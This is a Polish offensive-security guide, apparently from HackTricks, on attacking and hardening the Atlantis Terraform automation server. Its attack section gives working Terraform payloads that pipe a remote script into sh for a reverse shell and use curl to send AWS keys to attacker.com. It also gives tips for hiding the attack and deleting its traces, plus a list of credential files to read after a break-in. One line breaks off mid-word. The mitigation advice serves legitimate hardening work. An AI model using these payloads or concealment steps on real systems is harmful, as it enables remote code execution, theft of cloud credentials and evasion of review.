# Bezpieczeństwo Atlantis

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Atlantis pomaga w uruchamianiu terraformy z żądań Pull Requests z serwera git.

![](<../.gitbook/assets/image (51).png>)

## Lokalne laboratorium

1. Przejdź do **strony wydań atlantis** na [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) i **pobierz** odpowiednią wersję.
2. Utwórz **token osobisty** (z dostępem do repozytorium) dla swojego użytkownika **github**.
3. Wykonaj polecenie `./atlantis testdrive`, a zostanie utworzone **repozytorium demo**, które można użyć do **komunikacji z atlantis**.
1. Możesz uzyskać dostęp do strony internetowej pod adresem 127.0.0.1:4141

## Dostęp do Atlantis

### Poświadczenia serwera Git

**Atlantis** obsługuje kilka hostów git, takich jak **Github**, **Gitlab**, **Bitbucket** i **Azure DevOps**.\
Jednakże, aby uzyskać dostęp do repozytoriów na tych platformach i wykonywać działania, musi mieć pewne **uprzywilejowane uprawnienia** (przynajmniej uprawnienia do zapisu).\
[**Dokumentacja**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) zaleca utworzenie użytkownika na tych platformach specjalnie dla Atlantis, ale niektórzy ludzie mogą używać kont osobistych.

{% hint style="warning" %}
W każdym przypadku, z perspektywy atakującego, **konto Atlantis** będzie bardzo **interesujące do skompromitowania**.
{% endhint %}

### Webhooki

Atlantis opcjonalnie używa [**tajemnic webhooków**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) do weryfikacji, czy otrzymuje **legitymacyjne webhooki** od hosta Git.

Jednym sposobem potwierdzenia tego jest **dozwolanie żądań tylko z określonych adresów IP** twojego hosta Git, ale łatwiejszym sposobem jest użycie Tajemnicy Webhooka.

Należy jednak zauważyć, że chyba że używasz prywatnego serwera github lub bitbucket, będziesz musiał udostępnić punkty końcowe webhooka w Internecie.

{% hint style="warning" %}
Atlantis będzie **udostępniał webhooki**, więc serwer git może wysyłać mu informacje. Z perspektywy atakującego byłoby interesujące dowiedzieć się, **czy można wysyłać do niego wiadomości**.
{% endhint %}

### Poświadczenia dostawcy <a href="#provider-credentials" id="provider-credentials"></a>

[Z dokumentacji:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis uruchamia Terraformę, po prostu wykonując polecenia `terraform plan` i `apply` na serwerze, na którym jest hostowany Atlantis. Podobnie jak w przypadku uruchamiania Terraformy lokalnie, Atlantis potrzebuje poświadczeń dla konkretnego dostawcy.

To zależy od ciebie, jak [dostarczasz poświadczenia](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) dla konkretnego dostawcy dla Atlantis:

* Charta Helm Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) i [Moduł AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) mają swoje własne mechanizmy do dostarczania poświadczeń dostawcy. Przeczytaj ich dokumentację.
* Jeśli uruchamiasz Atlantis w chmurze, wiele chmur ma sposoby udzielania dostępu do API chmury aplikacjom działającym na nich, np.:
* [Role AWS EC2](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Wyszukaj "EC2 Role")
* [Konta usług instancji GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Wielu użytkowników ustawia zmienne środowiskowe, np. `AWS_ACCESS_KEY`, gdzie działa Atlantis.
* Inni tworzą niezbędne pliki konfiguracyjne, np. `~/.aws/credentials`, gdzie działa Atlantis.
* Użyj dostawcy [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs), aby uzyskać poświadczenia dostawcy.

{% hint style="warning" %}
**Kontener**, w którym **działa Atlantis**, prawdopodobnie będzie zawierał uprzywilejowane poświadczenia dostawców (AWS, GCP, Github...), którymi Atlantis zarządza za pomocą Terraformy.
{% endhint %}

### Strona internetowa

Domyślnie Atlantis uruchamia **stronę internetową na porcie 4141 na localhost**. Ta strona pozwala tylko na włączanie/wyłączanie aplikacji atlantis i sprawdzanie stanu planu repozytoriów oraz ich odblokowywanie (nie pozwala na modyfikowanie rzeczy, więc nie jest zbyt przydatna).

Prawdopodobnie nie będzie ona dostępna z Internetu, ale domyślnie **nie są wymagane żadne poświadczenia**, aby uzyskać do niej dostęp (a jeśli są, domyślne to `atlantis`:`atlantis`).

## Konfiguracja serwera

Konfigurację dla `atlantis server` można określić za pomocą flag wiersza poleceń, zmiennych środowiskowych, pliku konfiguracyjnego lub mieszanki tych trzech opcji.

* Możesz znaleźć [**tutaj listę flag**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) obsługiwanych przez serwer Atlantis
* Możesz znaleźć [**tutaj, jak przekształcić opcję konfiguracji w zmienną środowiskową**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Wartości są **wybierane w tej kolejności**:

1. Flagi
2. Zmienne środowiskowe
3. Plik konfiguracyjny

{% hint style="warning" %}
Należy zauważyć, że w konfiguracji można znaleźć interesujące wartości, takie jak **tokeny i hasła**.
{% endhint %}

### Konfiguracja repozytoriów

Niektóre konfiguracje wpływają na **sposób zarządzania repozytoriami**. Jednak możliwe, że **każde repozytorium wymaga różnych ustawień**, dlatego istnieją sposoby określenia każdego repozytorium. Oto kolejność priorytetów:

1. Plik [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config). Ten plik może być używany do określenia, jak atlantis powinien traktować repozytorium. Jednak domyślnie niektóre klucze nie mogą być tutaj określone bez odpowiednich flag.
1. Prawdopodobnie wym
#### Ochrona PR

Atlantis umożliwia wskazanie, czy **PR** powinien być **`zatwierdzony`** przez inną osobę (nawet jeśli nie jest to ustawione w ochronie gałęzi) i/lub czy powinien być **`scalowalny`** (przeszedł ochronę gałęzi) **przed uruchomieniem apply**. Z punktu widzenia bezpieczeństwa zaleca się ustawienie obu opcji.

Jeśli `allowed_overrides` jest ustawione na True, te ustawienia mogą być **nadpisane dla każdego projektu przez plik `/atlantis.yml`**.

#### Skrypty

Konfiguracja repozytorium może **określać skrypty**, które mają być uruchamiane [**przed**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) i [**po**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) wykonaniu **workflow**.

Nie ma żadnej opcji, która pozwala na **określenie** tych skryptów w pliku **repo `/atlantis.yml`**.

#### Workflow

W konfiguracji repozytorium (konfiguracja po stronie serwera) można [**określić nowy domyślny workflow**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) lub [**utworzyć nowe niestandardowe workflow**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Można również **określić**, które **repozytoria** mają **dostęp** do **nowo** utworzonych workflow.\
Następnie można zezwolić na **określenie workflow** do użycia w pliku **atlantis.yaml** dla każdego repozytorium.

{% hint style="danger" %}
Jeśli flaga [**konfiguracji po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` jest ustawiona na **True**, workflow można **określić** w pliku **`atlantis.yaml`** dla każdego repozytorium. Potencjalnie konieczne jest również, aby **`allowed_overrides`** określało również **`workflow`** w celu **nadpisania workflow**, które ma być używane.\
To praktycznie daje **RCE w serwerze Atlantis dla każdego użytkownika, który ma dostęp do tego repozytorium**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Sprawdzanie zasad Conftest

Atlantis obsługuje uruchamianie **serwerowych** [**zasad conftest**](https://www.conftest.dev/) na wyjściu planu. Powszechne przypadki użycia tego kroku obejmują:

* Odmawianie korzystania z listy modułów
* Sprawdzanie atrybutów zasobu podczas tworzenia
* Wykrywanie niezamierzonych usunięć zasobów
* Zapobieganie ryzyku bezpieczeństwa (np. ujawnianie bezpiecznych portów publicznie)

Możesz sprawdzić, jak to skonfigurować w [**dokumentacji**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Komendy Atlantis

[W **dokumentacji**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) znajdziesz opcje, które możesz użyć do uruchomienia Atlantisa:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Ataki

{% hint style="warning" %}
Jeśli podczas eksploatacji napotkasz ten **błąd**: `Error: Error acquiring the state lock`

Możesz go naprawić, wykonując:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Modyfikacja konfiguracji w nowym PR

Jeśli masz uprawnienia do zapisu w repozytorium, będziesz mógł utworzyć na nim nową gałąź i wygenerować PR. Jeśli możesz **wykonać polecenie `atlantis plan`** (lub może jest ono wykonywane automatycznie), **będziesz mógł wykonać zdalne wykonanie kodu (RCE) na serwerze Atlantis**.

Możesz to zrobić, umieszczając [**zewnętrzne źródło danych dla Atlantis**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Wystarczy umieścić ładunek (payload) podobny do poniższego w pliku `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Stealthier Attack

Możesz przeprowadzić ten atak nawet w **bardziej skryty sposób**, postępując zgodnie z tymi sugestiami:

* Zamiast bezpośrednio dodawać rev shell do pliku terraform, możesz **załadować zewnętrzny zasób**, który zawiera rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Kod rev shell można znaleźć w [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* W zewnętrznym zasobie użyj funkcji **ref**, aby ukryć **kod rev shell terraformu w gałęzi** wewnątrz repozytorium, coś w stylu: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Zamiast** tworzyć **PR do mastera** w celu uruchomienia Atlantisa, **utwórz 2 gałęzie** (test1 i test2) i utwórz **PR z jednej do drugiej**. Po zakończeniu ataku po prostu **usuń PR i gałęzie**.

### Atlantis plan Secrets Dump

Możesz **wydobyć tajne informacje używane przez terraform** uruchamiając `atlantis plan` (`terraform plan`) poprzez umieszczenie czegoś takiego w pliku terraform:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis apply RCE - Modyfikacja konfiguracji w nowym PR

Jeśli masz uprawnienia do zapisu w repozytorium, będziesz mógł utworzyć na nim nową gałąź i wygenerować PR. Jeśli możesz **wykonać polecenie `atlantis apply`, będziesz mógł zdalnie wykonać kod (RCE) na serwerze Atlantis**.

Jednak zazwyczaj będziesz musiał ominąć pewne zabezpieczenia:

* **Możliwość scalenia**: Jeśli to zabezpieczenie jest ustawione w Atlantis, możesz uruchomić **`atlantis apply` tylko wtedy, gdy PR można scalić** (co oznacza, że zabezpieczenia gałęzi muszą zostać ominięte).
* Sprawdź potencjalne [**obejścia zabezpieczeń gałęzi**](broken-reference/)
* **Zatwierdzenie**: Jeśli to zabezpieczenie jest ustawione w Atlantis, **inny użytkownik musi zatwierdzić PR**, zanim będziesz mógł uruchomić `atlantis apply`.
* Domyślnie można wykorzystać [**token Gitbota do ominięcia tego zabezpieczenia**](broken-reference/)

Uruchomienie **`terraform apply` na złośliwym pliku Terraform z użyciem** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Musisz tylko upewnić się, że pewien ładunek, na przykład taki jak poniższe, znajduje się w pliku `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Postępuj zgodnie z **sugestiami z poprzedniej techniki**, aby przeprowadzić ten atak w **bardziej dyskretny sposób**.

### Wstrzykiwanie parametrów Terraform

Podczas uruchamiania `atlantis plan` lub `atlantis apply`, Terraform jest uruchamiany w tle, można przekazywać polecenia do Terraform z atlantis, komentując coś w ten sposób:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Coś, co możesz przekazać, to zmienne środowiskowe, które mogą być pomocne przy omijaniu niektórych zabezpieczeń. Sprawdź zmienne środowiskowe Terraform w [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Niestandardowy workflow

Wykonanie **złośliwych niestandardowych poleceń budowania** określonych w pliku `atlantis.yaml`. Atlantis używa pliku `atlantis.yaml` z gałęzi żądania wycofania, a **nie** z `master`.\
Ta możliwość została wspomniana w poprzedniej sekcji:

{% hint style="danger" %}
Jeśli flaga [**konfiguracji po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` jest ustawiona na **True**, można **określić** workflow w pliku **`atlantis.yaml`** każdego repozytorium. Potencjalnie konieczne jest również, aby **`allowed_overrides`** określało również **`workflow`**, aby **zastąpić workflow**, który ma być używany.

To w zasadzie daje **RCE w serwerze Atlantis dla każdego użytkownika, który ma dostęp do tego repozytorium**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Ominięcie zabezpieczeń planu/apply

Jeśli flaga [**konfiguracji po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _ma_ skonfigurowane `apply_requirements`, repozytorium może **zmodyfikować zabezpieczenia planu/apply, aby je ominąć**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### Przechwytywanie PR

Jeśli ktoś wysyła komentarze **`atlantis plan/apply` na twoje ważne żądania ściągnięcia**, spowoduje to uruchomienie terraformu w nieodpowiednim momencie.

Ponadto, jeśli nie masz skonfigurowanej **ochrony gałęzi**, aby żądać **ponownej oceny** każdego żądania ściągnięcia, gdy jest do niego **wysyłany nowy commit**, ktoś może **napisać złośliwe konfiguracje** (sprawdź poprzednie scenariusze) w konfiguracji terraformu, uruchomić `atlantis plan/apply` i uzyskać RCE.

Oto **ustawienie** w ochronie gałęzi Github:

![](<../.gitbook/assets/image (31).png>)

### Tajemnica webhooka

Jeśli uda ci się **ukraść tajemnicę webhooka** lub jeśli **nie ma żadnej tajemnicy webhooka**, można **wywołać webhook Atlantisa** i **wywołać polecenia atlantis** bezpośrednio.

### Bitbucket

Bitbucket Cloud **nie obsługuje tajemnic webhooka**. Może to umożliwić atakującym **podszycie się pod żądania z Bitbucket**. Upewnij się, że zezwalasz tylko na adresy IP Bitbucket.

* Oznacza to, że **atakujący** może tworzyć **fałszywe żądania do Atlantisa**, które wyglądają tak, jakby pochodziły z Bitbucket.
* Jeśli określasz `--repo-allowlist`, mogą one tylko tworzyć fałszywe żądania dotyczące tych repozytoriów, więc największe szkody, jakie mogą wyrządzić, to planowanie/wdrażanie w twoich własnych repozytoriach.
* Aby temu zapobiec, dodaj na listę dozwolonych [adresy IP Bitbucketa](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (patrz: Adresy IPv4 wychodzące).

## Post-Eksploatacja

Jeśli udało ci się uzyskać dostęp do serwera lub przynajmniej uzyskałeś LFI, istnieje kilka interesujących rzeczy, które warto spróbować odczytać:

* `/home/atlantis/.git-credentials` - zawiera dane dostępowe do VCS
* `/atlantis-data/atlantis.db` - zawiera dane dostępowe do VCS z dodatkowymi informacjami
* `/atlantis-data/repos/<nazwa_org>`_`/`_`<nazwa_repo>/<nr_pr>/<workspace>/<ścieżka_do_katalogu>/.terraform/terraform.tfstate` - plik stanu Terraformu
* Przykład: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` - zmienne środowiskowe
* `/proc/[2-20]/cmdline` - linia poleceń `atlantis server` (może zawierać poufne dane)

## Środki zaradcze

### Nie używaj na publicznych repozytoriach <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Ponieważ każdy może komentować publiczne żądania ściągnięcia, nawet przy wszystkich dostępnych środkach bezpieczeństwa, uruchamianie Atlantisa na publicznych repozytoriach bez odpowiedniej konfiguracji ustawień bezpieczeństwa jest nadal niebezpieczne.

### Nie używaj `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Jeśli używasz na publicznym repozytorium (co nie jest zalecane, patrz powyżej), nie powinieneś ustawiać `--allow-fork-prs` (domyślnie false), ponieważ każdy może otworzyć żądanie ściągnięcia z własnej kopii do twojego repozytorium.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis wymaga określenia listy repozytoriów, z których będzie akceptować webhooki za pomocą flagi `--repo-allowlist`. Na przykład:

* Konkretne repozytoria: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Cała twoja organizacja: `--repo-allowlist=github.com/runatlantis/*`
* Wszystkie repozytoria w twojej instalacji GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* Wszystkie repozytoria: `--repo-allowlist=*`. Przydatne, gdy jesteś w chronionej sieci, ale niebezpieczne bez ustawienia tajemnicy webhooka.

Ta flaga zapewnia, że twoja instalacja Atlantisa nie jest używana z repozytoriami, którymi nie zarządzasz. Szczegółowe informacje znajdują się w `atlantis server --help`.

### Ochrona planowania Terraformu <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Jeśli atakujący, składający żądania ściągnięcia z złośliwym kodem Terraformu, znajduje się w twoim modelu zagrożeń, musisz wiedzieć, że zatwierdzenia `terraform apply` to za mało. Możliwe jest uruchomienie złośliwego kodu w `terraform plan`, korzystając z [źródła danych zewnętrznych](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) lub podając złośliwego dostawcę. Taki kod może wyciekać twoje poświadczenia.

Aby temu zapobiec, możesz:

1. Wbudować dostawców w obraz Atlantisa lub hostować je i zablokować wychodzący ruch w produkcji.
2. Wdrożyć protokół rejestru dostawców wewnętrznie i zablokować publiczny ruch wychodzący, w ten sposób kontrolując, kto ma uprawnienia do zapisu w rejestrze.
3. Zmodyfikować [konfigurację repozytorium po stronie serwera](https://www.runatlantis.io/docs/server-side-repo-config.html) w kroku `plan`, aby sprawdzać, czy nie używane są niedozwolone dostawcy lub źródła danych lub czy PR-y nie pochodzą od niedozwolonych użytkowników. W tym momencie można również dodać dodatkową walidację, na przykład wymaganie "kciuka w górę" dla PR przed kontynuacją `plan`. Przydatne może być użycie Conftest.

### Tajemnice webhooka <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis powinien być uruchamiany z ustawionymi tajemnicami webhooka za pomocą zmiennych środowiskowych `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Nawet jeśli ustawiona jest flaga `--repo-allowlist`, bez tajemnicy webhooka atakujący może wysyłać żądania do Atlantisa podszywając się pod repozytorium, które jest na liście dozwolonych. Tajemnice webhooka zapewniają, że żądania webhooka faktycznie pochodzą od twojego dostawcy VCS (GitHub lub GitLab).

Jeśli używasz Azure DevOps, zamiast tajemnic webhooka dodaj podstawową nazwę użytkownika i hasło.

### Podstawowe uwierzytelnianie Azure DevOps <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps obsługuje wysył
